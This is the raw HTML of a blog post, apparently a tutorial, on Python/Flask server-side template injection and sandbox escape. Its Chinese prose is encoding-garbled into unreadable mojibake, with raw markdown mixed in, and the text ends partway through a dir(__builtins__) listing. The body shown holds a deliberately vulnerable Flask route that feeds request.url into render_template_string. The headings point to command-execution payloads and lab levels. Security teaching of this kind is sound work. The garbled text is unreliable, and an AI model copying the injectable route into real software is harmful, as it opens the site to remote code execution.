<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#6200ee"><meta name="author" content="m0re"><meta name="copyright" content="m0re"><meta name="generator" content="Hexo 5.1.0"><meta name="theme" content="hexo-theme-yun"><title>Pythonçš„SSTIæ¨¡ç‰ˆæ³¨å…¥åŠæ²™ç›’é€ƒé€¸ | m0reçš„å°ç«™</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.24/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_j5gk85dg4pf.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
});
</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" href="/m0re.ico"><link rel="mask-icon" href="/m0re.ico" color="#6200ee"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"m0re.top","root":"/","title":"äººç”Ÿè·¯æ¼«æ¼«","version":"1.6.1","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"æœç´¢...","empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹: ${query}","hits":"æ‰¾åˆ° ${hits} æ¡ç»“æœ","hits_time":"æ‰¾åˆ° ${hits} æ¡ç»“æœï¼ˆç”¨æ—¶ ${time} æ¯«ç§’ï¼‰"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><meta name="description" content="é€‰ä¸€ç§å§¿æ€ï¼Œè®©è‡ªå·±æ´»æˆæ— å¯æ›¿ä»£ å‰è¨€æœ€è¿‘çœ‹pythonçš„SSTIæ¨¡æ¿æ³¨å…¥ï¼Œæ­¤æ–‡éƒ¨åˆ†å†…å®¹ä¸ºè½¬è½½ï¼Œå¸ˆå‚…å†™çš„å¾ˆå¥½ï¼Œå°±æ‘˜å½•äº†ä¸€éƒ¨åˆ†ä¸‹æ¥ï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;188172é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜åœ¨å…ˆçŸ¥ä¸Šçœ‹åˆ°äº†ä¸€ç¯‡å…³äºä¸€ä¸ªsstilabsé¶åœºçš„ä¸€ç¯‡æ–‡ç« ï¼Œåœ°å€åœ¨è¿™é‡Œï¼šhttps:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;10394 åŸç†è€ç”Ÿå¸¸è°ˆçš„é—®é¢˜:ä»€ä¹ˆæ˜¯SSTIï¼Œæ¨¡ç‰ˆæ³¨">
<meta property="og:type" content="article">
<meta property="og:title" content="Pythonçš„SSTIæ¨¡ç‰ˆæ³¨å…¥åŠæ²™ç›’é€ƒé€¸">
<meta property="og:url" content="https://m0re.top/posts/39874e07/index.html">
<meta property="og:site_name" content="m0reçš„å°ç«™">
<meta property="og:description" content="é€‰ä¸€ç§å§¿æ€ï¼Œè®©è‡ªå·±æ´»æˆæ— å¯æ›¿ä»£ å‰è¨€æœ€è¿‘çœ‹pythonçš„SSTIæ¨¡æ¿æ³¨å…¥ï¼Œæ­¤æ–‡éƒ¨åˆ†å†…å®¹ä¸ºè½¬è½½ï¼Œå¸ˆå‚…å†™çš„å¾ˆå¥½ï¼Œå°±æ‘˜å½•äº†ä¸€éƒ¨åˆ†ä¸‹æ¥ï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;188172é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜åœ¨å…ˆçŸ¥ä¸Šçœ‹åˆ°äº†ä¸€ç¯‡å…³äºä¸€ä¸ªsstilabsé¶åœºçš„ä¸€ç¯‡æ–‡ç« ï¼Œåœ°å€åœ¨è¿™é‡Œï¼šhttps:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;10394 åŸç†è€ç”Ÿå¸¸è°ˆçš„é—®é¢˜:ä»€ä¹ˆæ˜¯SSTIï¼Œæ¨¡ç‰ˆæ³¨">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20220107010042.jpeg">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20201206161515.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20201206201259.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20201206201332.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20220107011452.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20220108005319.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20220108005424.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20220110145820.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20220110150512.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20220110153731.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20220110161207.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20220110161515.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20220110161829.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20220110164037.png">
<meta property="article:published_time" content="2022-01-10T12:05:32.907Z">
<meta property="article:modified_time" content="2022-01-10T12:04:45.188Z">
<meta property="article:author" content="m0re">
<meta property="article:tag" content="Python">
<meta property="article:tag" content="SSTI">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/m0re/picture/raw/master/img/20220107010042.jpeg"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="æ–‡ç« ç›®å½•"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="ç«™ç‚¹æ¦‚è§ˆ"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="m0re"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="m0re"><span class="site-author-status" title="ç©·é¬¼å•Šå•Šå•Šå•Š">ğŸ˜­</span></a><div class="site-author-name"><a href="/about/">m0re</a></div><span class="site-name">m0reçš„å°ç«™</span><sub class="site-subtitle"></sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="é¦–é¡µ"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="å½’æ¡£"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">123</span></a></div><div class="site-state-item"><a href="/categories/" title="åˆ†ç±»"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">21</span></a></div><div class="site-state-item"><a href="/tags/" title="æ ‡ç­¾"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">54</span></a></div><a class="site-state-item hty-icon-button" href="/Tools/" title="Tools"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/zxcv0221" title="GitHub" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="å“”å“©å“”å“©åŠ¨ç”»" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://twitter.com/ISm0r3" title="Twitter" target="_blank" style="color:#1da1f2"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-twitter-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:m0re.lxj@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="æˆ‘çš„å°ä¼™ä¼´ä»¬" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">åŸç†</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.1.</span> <span class="toc-text">å‘½ä»¤æ‰§è¡Œ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#os-system"><span class="toc-number">2.2.</span> <span class="toc-text">os.system</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#os-popen"><span class="toc-number">2.3.</span> <span class="toc-text">os.popen()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#subprocess"><span class="toc-number">2.4.</span> <span class="toc-text">subprocess</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload%E5%A6%82%E4%BD%95%E6%9E%84%E9%80%A0%E7%9A%84"><span class="toc-number">3.</span> <span class="toc-text">payloadå¦‚ä½•æ„é€ çš„</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTIlabs"><span class="toc-number">4.</span> <span class="toc-text">SSTIlabs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-1"><span class="toc-number">4.1.</span> <span class="toc-text">Level-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-2"><span class="toc-number">4.2.</span> <span class="toc-text">Level-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-9"><span class="toc-number">4.3.</span> <span class="toc-text">Level-9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-10"><span class="toc-number">4.4.</span> <span class="toc-text">level-10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-11"><span class="toc-number">4.5.</span> <span class="toc-text">Level-11</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">ç»“</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://m0re.top/posts/39874e07/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="m0re"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="m0reçš„å°ç«™"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Pythonçš„SSTIæ¨¡ç‰ˆæ³¨å…¥åŠæ²™ç›’é€ƒé€¸</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <span class="post-meta-icon-text">å‘è¡¨äº</span> <time title="åˆ›å»ºæ—¶é—´ï¼š2022-01-10 20:05:32" itemprop="dateCreated datePublished" datetime="2022-01-10T20:05:32+08:00">2022-01-10</time></div><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="é˜…è¯»æ¬¡æ•°"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span id="busuanzi_value_page_pv"></span></span></span><span class="leancloud_visitors" id="/posts/39874e07/" data-flag-title="Pythonçš„SSTIæ¨¡ç‰ˆæ³¨å…¥åŠæ²™ç›’é€ƒé€¸"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="é˜…è¯»æ¬¡æ•°"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Web/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Web</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/Python/" style="--text-color:#3776ab"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">Python</span></a><a class="tag-item" href="/tags/SSTI/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">SSTI</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#6200ee;"><p><img src="https://gitee.com/m0re/picture/raw/master/img/20220107010042.jpeg" loading="lazy"><br>é€‰ä¸€ç§å§¿æ€ï¼Œè®©è‡ªå·±æ´»æˆæ— å¯æ›¿ä»£</p>
<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘çœ‹pythonçš„SSTIæ¨¡æ¿æ³¨å…¥ï¼Œæ­¤æ–‡éƒ¨åˆ†å†…å®¹ä¸ºè½¬è½½ï¼Œå¸ˆå‚…å†™çš„å¾ˆå¥½ï¼Œå°±æ‘˜å½•äº†ä¸€éƒ¨åˆ†ä¸‹æ¥ï¼ŒåŸæ–‡é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188172">https://www.anquanke.com/post/id/188172</a><br>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜åœ¨å…ˆçŸ¥ä¸Šçœ‹åˆ°äº†ä¸€ç¯‡å…³äºä¸€ä¸ªsstilabsé¶åœºçš„ä¸€ç¯‡æ–‡ç« ï¼Œåœ°å€åœ¨è¿™é‡Œï¼š<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10394">https://xz.aliyun.com/t/10394</a></p>
<h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>è€ç”Ÿå¸¸è°ˆçš„é—®é¢˜:ä»€ä¹ˆæ˜¯SSTIï¼Œæ¨¡ç‰ˆæ³¨å…¥ï¼Œæ³¨å…¥çš„çŸ¥è¯†ï¼Œå°±æ˜¯æ²¡æœ‰æ§åˆ¶å¥½ç”¨æˆ·è¾“å…¥çš„æ•°æ®ï¼Œä»è€Œä½¿å¾—ç”¨æˆ·æ’å…¥çš„æ•°æ®å˜æˆå¯æ‰§è¡Œç¨‹åºçš„ä¸€éƒ¨åˆ†ï¼Œæ”¹å˜ç¨‹åºçš„æ‰§è¡Œé€»è¾‘ã€‚</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
    <span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template
    <span class="token keyword">from</span> flask <span class="token keyword">import</span> request
    <span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template_string
    app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
    <span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/test'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        template <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
            &lt;div class="center-content error">
                &lt;h1>Oops! That page doesn't exist.&lt;/h1>
                &lt;h3>%s&lt;/h3>
            &lt;/div> 
        '''</span> <span class="token operator">%</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
<span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span>
    <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
        app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">True</span>
        app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>æœ€å…¸å‹çš„sstiæ¼æ´ï¼ŒåŸå› æ˜¯<code>render_template_string</code>å‡½æ•°åœ¨æ¸²æŸ“æ¨¡ç‰ˆçš„æ—¶å€™ä½¿ç”¨<code>%s</code>æ¥æ›¿æ¢å­—ç¬¦ä¸²ï¼ŒFlaskä¸­ä½¿ç”¨äº†Jinja2ä½œä¸ºæ¨¡æ¿æ¸²æŸ“å¼•æ“ï¼Œ<code>&#123;&#123;&#125;&#125;`åœ¨Jinja2ä½œä¸ºå˜é‡åŒ…è£¹æ ‡è¯†ç¬¦ï¼Œåœ¨æ¸²æŸ“æ—¶ä¼šæŠŠ`&#123;&#123;&#125;&#125;</code>åŒ…è£¹çš„å†…å®¹å½“ä½œå˜é‡è§£ææ›¿æ¢ï¼Œæ¯”å¦‚2ä¼šè¢«è§£ææˆ2<br><img src="https://gitee.com/m0re/picture/raw/master/img/20201206161515.png" alt="m0re" loading="lazy"><br>äº§ç”ŸSSTIçš„åŸå› æ˜¯ç”±äºæ¨¡æ¿æ¸²æŸ“æ—¶ï¼Œé—®é¢˜ä»£ç ä¸ºäº†ä½¿å¾—ç”¨æˆ·è¾“å…¥æ›´åŠ æ–¹ä¾¿ï¼Œè®©åŠŸèƒ½æ›´åŠ çµæ´»ï¼Œæ‰€ä»¥æ‰å¯¼è‡´äº†ç›´æ¥å°†ç”¨æˆ·è¾“å…¥å¾—urlæ‹¼æ¥åˆ°templateä¸­ï¼Œç„¶ååœ¨è¿›è¡Œæ¸²æŸ“ï¼Œæ‰€ä»¥åœ¨ç”¨æˆ·ä¼ å…¥çš„å†…å®¹ä¸­åŒ…æ‹¬äº†<code>&#123;&#123;xxx&#125;&#125;</code>ï¼Œé‚£ä¹ˆåœ¨ä½¿ç”¨æ—¶å°±ä¼šè¢«æ¸²æŸ“ï¼Œè¿›è€Œ<code>&#123;&#123;&#125;&#125;`å†…çš„å†…å®¹ä¼šè¢«è§£æã€‚
## PythonåŸºç¡€
### å†…å»ºå‡½æ•°
åœ¨å¯åŠ¨äº¤äº’å¼pythonè§£é‡Šå™¨çš„æ—¶å€™ï¼Œè¿˜æ²¡æœ‰åˆ›å»ºä»»ä½•å‡½æ•°å’Œå˜é‡ï¼Œä½†æ˜¯ç¡®ç›´æ¥å¯ä»¥ä½¿ç”¨`print()`ç­‰å‡½æ•°ï¼Œè¿™äº›å‡½æ•°å°±è¢«ç§°ä¸ºå†…å»ºå‡½æ•°ã€‚
å†…å»ºå‡½æ•°æ˜¯åœ¨å¯åŠ¨æ—¶è‡ªè¡Œå¯¼å…¥å†…å­˜ï¼Œä»¥ä¾›ä½¿ç”¨ã€‚
> å†…å»ºåç§°ç©ºé—´ï¼špythonè‡ªå¸¦çš„åå­—ï¼Œåœ¨pythonè§£é‡Šå™¨å¯åŠ¨æ—¶äº§ç”Ÿï¼Œå­˜æ”¾ä¸€äº›pythonå†…ç½®çš„åå­—
å…¨å±€åç§°ç©ºé—´ï¼šåœ¨æ‰§è¡Œæ–‡ä»¶æ—¶ï¼Œå­˜æ”¾æ–‡ä»¶çº§åˆ«å®šä¹‰çš„åå­—
å±€éƒ¨åç§°ç©ºé—´ï¼ˆå¯èƒ½ä¸å­˜åœ¨ï¼‰ï¼šåœ¨æ‰§è¡Œæ–‡ä»¶çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœè°ƒç”¨äº†å‡½æ•°ï¼Œåˆ™ä¼šäº§ç”Ÿè¯¥å‡½æ•°çš„åç§°ç©ºé—´ï¼Œç”¨æ¥å­˜æ”¾è¯¥å‡½æ•°å†…å®šä¹‰çš„åå­—ï¼Œè¯¥åå­—åœ¨å‡½æ•°è°ƒç”¨æ—¶ç”Ÿæ•ˆï¼Œè°ƒç”¨ç»“æŸåå¤±æ•ˆ

åŠ è½½é¡ºåºï¼šå†…ç½®åç§°ç©ºé—´----->å…¨å±€åç§°ç©ºé—´------>å±€éƒ¨åç§°ç©ºé—´ã€‚
åå­—æŸ¥æ‰¾é¡ºåº: å±€éƒ¨åç§°ç©ºé—´----->å…¨å±€åç§°ç©ºé—´------>å†…ç½®åç§°ç©ºé—´

æˆ‘ä»¬ä¸»è¦å…³æ³¨çš„æ˜¯å†…å»ºåç§°ç©ºé—´ï¼Œæ˜¯åå­—åˆ°å†…å»ºå¯¹è±¡çš„æ˜ å°„ï¼Œåœ¨pythonä¸­ï¼Œåˆå§‹çš„builtinsæ¨¡å—æä¾›å†…å»ºåç§°ç©ºé—´åˆ°å†…å»ºå¯¹è±¡çš„æ˜ å°„
dir()å‡½æ•°å¯ä»¥å±•ç¤ºä¸€ä¸ªå¯¹è±¡çš„å±æ€§æœ‰ä»€ä¹ˆï¼Œåœ¨ä¸æä¾›å¯¹è±¡çš„æ—¶å€™ï¼Œå°†ä¼šæä¾›å½“å‰ç¯å¢ƒæ‰€å¯¼å…¥çš„æ‰€æœ‰æ¨¡å—ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åˆå§‹æ¨¡å—æœ‰å“ªäº›
<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token string">'__annotations__'</span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">,</span> <span class="token string">'__doc__'</span><span class="token punctuation">,</span> <span class="token string">'__loader__'</span><span class="token punctuation">,</span> <span class="token string">'__name__'</span><span class="token punctuation">,</span> <span class="token string">'__package__'</span><span class="token punctuation">,</span> <span class="token string">'__spec__'</span><span class="token punctuation">]</span></code></pre>
è¿˜å¯ä»¥çœ‹ä¸€ä¸‹`__builtins__`,å®ƒæ˜¯ä½œä¸ºé»˜è®¤æ¨¡å—å‡ºç°çš„ï¼Œé‚£ä¹ˆå®ƒçš„ä¸‹é¢å‡½æ•°åº”è¯¥å¾ˆå¤šçš„
<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">dir</span><span class="token punctuation">(</span>__builtins__<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token string">'ArithmeticError'</span><span class="token punctuation">,</span> <span class="token string">'AssertionError'</span><span class="token punctuation">,</span> <span class="token string">'AttributeError'</span><span class="token punctuation">,</span> <span class="token string">'BaseException'</span><span class="token punctuation">,</span> <span class="token string">'BlockingIOError'</span><span class="token punctuation">,</span> <span class="token string">'BrokenPipeError'</span><span class="token punctuation">,</span> <span class="token string">'BufferError'</span><span class="token punctuation">,</span> <span class="token string">'BytesWarning'</span><span class="token punctuation">,</span> <span class="token string">'ChildProcessError'</span><span class="token punctuation">,</span> <span class="token string">'ConnectionAbortedError'</span><span class="token punctuation">,</span> <span class="token string">'ConnectionError'</span><span class="token punctuation">,</span> <span class="token string">'ConnectionRefusedError'</span><span class="token punctuation">,</span> <span class="token string">'ConnectionResetError'</span><span class="token punctuation">,</span> <span class="token string">'DeprecationWarning'</span><span class="token punctuation">,</span> <span class="token string">'EOFError'</span><span class="token punctuation">,</span> <span class="token string">'Ellipsis'</span><span class="token punctuation">,</span> <span class="token string">'EnvironmentError'</span><span class="token punctuation">,</span> <span class="token string">'Exception'</span><span class="token punctuation">,</span> <span class="token string">'False'</span><span class="token punctuation">,</span> <span class="token string">'FileExistsError'</span><span class="token punctuation">,</span> <span class="token string">'FileNotFoundError'</span><span class="token punctuation">,</span> <span class="token string">'FloatingPointError'</span><span class="token punctuation">,</span> <span class="token string">'FutureWarning'</span><span class="token punctuation">,</span> <span class="token string">'GeneratorExit'</span><span class="token punctuation">,</span> <span class="token string">'IOError'</span><span class="token punctuation">,</span> <span class="token string">'ImportError'</span><span class="token punctuation">,</span> <span class="token string">'ImportWarning'</span><span class="token punctuation">,</span> <span class="token string">'IndentationError'</span><span class="token punctuation">,</span> <span class="token string">'IndexError'</span><span class="token punctuation">,</span> <span class="token string">'InterruptedError'</span><span class="token punctuation">,</span> <span class="token string">'IsADirectoryError'</span><span class="token punctuation">,</span> <span class="token string">'KeyError'</span><span class="token punctuation">,</span> <span class="token string">'KeyboardInterrupt'</span><span class="token punctuation">,</span> <span class="token string">'LookupError'</span><span class="token punctuation">,</span> <span class="token string">'MemoryError'</span><span class="token punctuation">,</span> <span class="token string">'ModuleNotFoundError'</span><span class="token punctuation">,</span> <span class="token string">'NameError'</span><span class="token punctuation">,</span> <span class="token string">'None'</span><span class="token punctuation">,</span> <span class="token string">'NotADirectoryError'</span><span class="token punctuation">,</span> <span class="token string">'NotImplemented'</span><span class="token punctuation">,</span> <span class="token string">'NotImplementedError'</span><span class="token punctuation">,</span> <span class="token string">'OSError'</span><span class="token punctuation">,</span> <span class="token string">'OverflowError'</span><span class="token punctuation">,</span> <span class="token string">'PendingDeprecationWarning'</span><span class="token punctuation">,</span> <span class="token string">'PermissionError'</span><span class="token punctuation">,</span> <span class="token string">'ProcessLookupError'</span><span class="token punctuation">,</span> <span class="token string">'RecursionError'</span><span class="token punctuation">,</span> <span class="token string">'ReferenceError'</span><span class="token punctuation">,</span> <span class="token string">'ResourceWarning'</span><span class="token punctuation">,</span> <span class="token string">'RuntimeError'</span><span class="token punctuation">,</span> <span class="token string">'RuntimeWarning'</span><span class="token punctuation">,</span> <span class="token string">'StopAsyncIteration'</span><span class="token punctuation">,</span> <span class="token string">'StopIteration'</span><span class="token punctuation">,</span> <span class="token string">'SyntaxError'</span><span class="token punctuation">,</span> <span class="token string">'SyntaxWarning'</span><span class="token punctuation">,</span> <span class="token string">'SystemError'</span><span class="token punctuation">,</span> <span class="token string">'SystemExit'</span><span class="token punctuation">,</span> <span class="token string">'TabError'</span><span class="token punctuation">,</span> <span class="token string">'TimeoutError'</span><span class="token punctuation">,</span> <span class="token string">'True'</span><span class="token punctuation">,</span> <span class="token string">'TypeError'</span><span class="token punctuation">,</span> <span class="token string">'UnboundLocalError'</span><span class="token punctuation">,</span> <span class="token string">'UnicodeDecodeError'</span><span class="token punctuation">,</span> <span class="token string">'UnicodeEncodeError'</span><span class="token punctuation">,</span> <span class="token string">'UnicodeError'</span><span class="token punctuation">,</span> <span class="token string">'UnicodeTranslateError'</span><span class="token punctuation">,</span> <span class="token string">'UnicodeWarning'</span><span class="token 